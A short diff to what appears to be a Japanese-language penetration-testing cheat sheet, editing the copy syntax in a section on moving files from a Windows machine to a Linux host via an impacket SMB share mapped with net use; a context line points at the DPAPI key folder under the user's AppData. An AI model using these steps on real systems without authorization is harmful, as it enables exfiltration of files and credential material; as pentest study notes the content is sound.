@@ -136,5 +136,5 @@ dir /S /AS C:\Users\<ユーザー>\AppData\Roaming\Microsoft\Protect # ユーザ
 impacket-smbserver <共有名> $(pwd) -smb2support
 # windowsで実行
 net use X: \\<Linux IP>\<共有名>
-copy/xcopy/robocopy <送信ファイル> X:\<保存名>
+copy/xcopy <送信ファイル> X:\<保存名> #もしくは robocopy <ディレクトリ> X:\ <送信ファイル>
 ```
